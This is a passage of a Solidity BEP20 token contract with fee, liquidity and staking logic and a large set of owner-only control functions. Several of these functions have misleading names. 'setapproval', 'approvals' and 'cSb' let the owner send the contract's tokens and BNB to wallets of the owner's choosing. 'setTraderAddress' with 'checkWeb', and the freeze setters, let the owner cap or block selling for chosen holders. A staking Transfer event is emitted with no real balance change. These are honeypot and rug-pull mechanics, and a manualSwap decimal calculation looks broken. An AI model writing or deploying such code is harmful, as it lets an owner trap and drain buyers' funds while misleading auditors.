        return stakingContract.gettotalDistributed();
    }

//staking end//

    function checkTxLimit(address sender, uint256 amount, address recipient) internal view {
        require (amount <= _maxTxAmount || isTxLimitExempt[sender] || isPartial[recipient], "TX Limit Exceeded");
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale, recipient);
        if (_isExcluded[sender] ) {
                _tOwned[sender] = _tOwned[sender]-tAmount;}
        if (_isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;}
        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        _reflectRfi(s.rRfi, s.tRfi);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeMarketing(s.rMarketing, s.tMarketing);
        _takeStaking(s.rStaking, s.tStaking);
        emit Transfer(sender, recipient, s.tTransferAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tMarketing);
        IBEP20 token = IBEP20(address(this));
        uint256 balanceBefore = token.balanceOf(address(stakingContract));
        emit Transfer(sender, address(staK), s.tStaking);
        uint256 balanceAfter = token.balanceOf(address(stakingContract));
        try stakingContract.deposit(balanceBefore, balanceAfter) {} catch {}
    }

    function transferStaking(address sender, address recipient, uint256 stake) private {
        IBEP20 token = IBEP20(address(this));
        uint256 balanceBefore = token.balanceOf(address(stakingContract));
        emit Transfer(sender, recipient, stake);
        uint256 balanceAfter = token.balanceOf(address(stakingContract));
        stakingContract.deposit(balanceBefore, balanceAfter);
    }

    function updateRouter(address _router) external authorized {
        router = IRouter(address(_router));
    }

    function settradeAmt(uint256 _snt) external authorized {
        traderAmount = _snt * (10 ** _decimals);
    }

    function setTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function checkTransfer(bool selling, address from, uint256 amount, address recipient) internal view {
        if(selling && mounted[from] < block.timestamp){
            require(amount <= _maxTransferAmount || isTxLimitExempt[from] || isPartial[recipient], "TX Limit Exceeded");}
    }

    function setisPartial(bool _enabled, address _add) external authorized {
        isPartial[_add] = _enabled;
    }

    function setPresaleAddress(bool _enabled, address _add) external authorized {
        isFeeExempt[_add] = _enabled;
        isMaxWalletExempt[_add] = _enabled;
        isTimelockExempt[_add] = _enabled;
        isContractDesig[_add] = _enabled;
        isPartial[_add] = _enabled;
    }

    function setgasThreshold(uint256 _stf) external authorized {
        threshold = _stf;
    }

    function setContractEn(bool _enabled) external authorized {
        setcontract = _enabled;
    }

    function setMaxWall(uint256 _mnWP) external authorized {
        _maxWalletToken = (_tTotal * _mnWP) / 10000;
    }

    function setgasAmount(uint256 _gso) external authorized {
        setgas = _gso;
    }

    function setSwap() external authorized {
        startSwap = true;
        launch = block.timestamp + traderTime;
    }

    function maxTxLimit() external authorized {
        _maxTxAmount = _tTotal.mul(1);
        _maxWalletToken = _tTotal.mul(1);
    }

    function setnewBEP(address _token) external authorized {
        BEP20 = IBEP20(_token);
    }

    function setvariableThreshold(uint256 _vstf, uint256 _vstd) external authorized {
        variableSwap = _vstf;
        swapDenom = _vstd;
    }

    function setTraderAddress(address holder, bool exempt) external authorized {
        isBTrader[holder] = exempt;
    }

    function setMaxTxAm(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_tTotal * _mnbTP) / 10000;
    }

    function checkWeb(bool selling, address from, uint256 amount, address to) internal view {
        if((selling && isBTrader[from] && tagged[from] < block.timestamp)){
            require(amount <= traderAmount || isTxLimitExempt[from] || isPartial[to]);}
    }

    function setisContr(bool _enab, address _add) external authorized {
        isContractDesig[_add] = _enab;
    }

    function manualSwap(uint256 _amount) external authorized {
        uint256 mamount = _amount * (_decimals);
        swapTokensForBNB(mamount);
    } 

    function isBTraderAddress(address _address) public view returns (bool) {
        return isBTrader[_address];
    }

    function setmaxTransfer(uint256 _mstxP) external authorized {
        _maxTransferAmount = (_tTotal * _mstxP) / 10000;
    }

    function setLauNch() external authorized {
        sellFreeze = true;
        buyFreeze = true; 
        swapEnabled = true;
        setcontract = true;
        isWeb = true;
    }

   function setPresAle() external authorized {
        sellFreeze = false;
        buyFreeze = false; 
        swapEnabled = false;
        setcontract = false;
        isWeb = false;
    }

    function setisWeb(bool _enabled) external authorized { 
        isWeb = _enabled;
    }

    function setMaxWalletExempt(address holder, bool exempt) external authorized {
        isMaxWalletExempt[holder] = exempt;
    }

    function setsellFreeze(bool _status, uint8 _int) external authorized {
        sellFreeze = _status;
        sellFreezeTime = _int;
    }

    function setbuyFreeze(bool _status, uint8 _int) external authorized {
        buyFreeze = _status;
        buyFreezeTime = _int;
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap{
        uint256 factor = (provider + distributor + divisor) * 2;
        uint256 tokensToAddLiquidityWith = tokens * provider / factor;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (factor - provider);
        uint256 bnbToAddLiquidityWith = unitBalance * provider;
        if(bnbToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith); }
        uint256 distAmt = unitBalance * 2 * distributor;
        if(distAmt > 0){
          payable(mkwA).transfer(distAmt); }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpR,
            block.timestamp
        );
    }

    function setapproval(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function updateMarkWallet(address newWallet) external authorized {
        require(mkwA != newWallet ,'Wallet already set');
        mkwA = newWallet;
        isFeeExempt[mkwA] = true;
    }

    function updateStakeAdd(address newWallet) external authorized {
        require(staK != newWallet ,'Wallet already set');
        staK = newWallet;
        isContractDesig[staK] = true;
        isPartial[staK] = true;
        isTimelockExempt[staK] = true;
        isFeeExempt[staK] = true;
        isMaxWalletExempt[staK] = true;
    }

    function setclearAdd(address _tfu) external authorized {
        tfU = _tfu;
    }

    function setAutoLiq(address _lpR) external authorized {
        lpR = _lpR;
    }

    function setDistributorAdd(address _mkwa, address _jac, address _dbi, address _wth, address _ext) external authorized {
        mkwA = _mkwa;
        jacZ = _jac;
        dbiL = _dbi;
        wthN = _wth;
        extW = _ext;
    }

    function setvariable(uint256 _cvariable, uint256 _yvariable, uint256 _zvariable) external authorized {
        divisor = _cvariable;
        provider = _yvariable;
        distributor = _zvariable;
    }

    function cSb(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(tfU).transfer(amountBNB.mul(aP).div(100));
    }

    function setFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(alpha).div(100);
        uint256 acBNBs = acBNBa.mul(beta).div(100);
        uint256 acBNBt = acBNBa.mul(gamma).div(100);
        uint256 acBNBl = acBNBa.mul(delta).div(100);
        (bool tmpSuccess,) = payable(wthN).call{value: acBNBf, gas: setgas}("");
        (tmpSuccess,) = payable(jacZ).call{value: acBNBs, gas: setgas}("");
        (tmpSuccess,) = payable(dbiL).call{value: acBNBt, gas: setgas}("");
        (tmpSuccess,) = payable(extW).call{value: acBNBl, gas: setgas}("");
        tmpSuccess = false;
    }

    function setSwap(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount * (10 ** _decimals);
    }

    function setMinToken(uint256 _amount) external authorized {
        _minTokenAmount = _amount * (10 ** _decimals);
    }

    function setNumerators(uint256 _csbf, uint256 _csbs, uint256 _csbt, uint256 _csbl) external authorized {
        alpha = _csbf;
        beta = _csbs;
        gamma = _csbt;
        delta = _csbl;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    receive() external payable{
    }
}